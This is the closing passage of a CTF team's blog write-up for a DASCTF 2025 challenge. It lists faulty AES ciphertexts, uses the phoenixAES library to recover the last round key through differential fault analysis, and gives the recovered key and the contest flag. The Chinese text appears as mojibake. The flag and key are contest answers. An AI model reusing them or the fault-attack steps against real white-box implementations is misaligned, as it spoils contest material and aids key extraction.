</span></span></span><span class=line><span class=cl><span class=s2>db997e93af7d2043bf20aa94a968bbef
</span></span></span><span class=line><span class=cl><span class=s2>db99de69af8aaf43bbadaa94bc68bbfc
</span></span></span><span class=line><span class=cl><span class=s2>db237e69417daf43bfadaa8cbc68c7ef
</span></span></span><span class=line><span class=cl><span class=s2>dbef7e69ef7daf43bfadaac5bc6822ef
</span></span></span><span class=line><span class=cl><span class=s2>b8997e69af7dafd3bfadbc94bc56bbef
</span></span></span><span class=line><span class=cl><span class=s2>db997e69af7daf43bfadaa94bc68bbef
</span></span></span><span class=line><span class=cl><span class=s2>db99f569af4aaf43deadaa94bc68bbf4
</span></span></span><span class=line><span class=cl><span class=s2>db99d669afcaaf43ebadaa94bc68bb00
</span></span></span><span class=line><span class=cl><span class=s2>db4b7e69c07daf43bfadaa86bc68bdef
</span></span></span><span class=line><span class=cl><span class=s2>c0997e69af7dafdcbfad5a94bc03bbef
</span></span></span><span class=line><span class=cl><span class=s2>db997e5baf7d5a43bf22aa943b68bbef
</span></span></span><span class=line><span class=cl><span class=s2>db997ed4af7da743bfc3aa941068bbef
</span></span></span><span class=line><span class=cl><span class=s2>db995969af5aaf437aadaa94bc68bb5f
</span></span></span><span class=line><span class=cl><span class=s2>db057e697a7daf43bfadaa6cbc684cef
</span></span></span><span class=line><span class=cl><span class=s2>a2997e69af7dafd8bfad6694bc18bbef
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>phoenixAES</span><span class=o>.</span><span class=n>crack_file</span><span class=p>(</span><span class=s1>&#39;tracefile&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=c1># Last round key #N found:</span>
</span></span><span class=line><span class=cl><span class=c1># 040D08DA68001026F3DC0D68897148B4</span>
</span></span></code></pre></td></tr></table></div></div><p>susæ±‚è§£ç¬¬ä¸€è½®å¯†é’¥ï¼š</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/3b0f6c59-984f-48fa-9cb7-f8d25f7482c1.png alt=img></p><p>44306E5175317830746535616E636830â€”â€”D0nQu1x0te5anch0</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/9612a3b1-cd10-43a3-a19c-77e48c3c8c5e.png alt=img></p><p>å¾—åˆ°flagä¸ºDASCTF{FALLEN_FLOWERS_FADE_NONE_CARES}</p><div class=blog-tags><a href=https://su-team.cn/tags/dasctf/>DASCTF</a>&nbsp;</div></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/2025-suctf-official-writeup-docker/ data-toggle=tooltip data-placement=top title="2025 SUCTF å®˜æ–¹WriteUp&amp;Docker">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/l3hctf-2025-su-wu/ data-toggle=tooltip data-placement=top title="2025 L3HCTF SU WriteUp">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>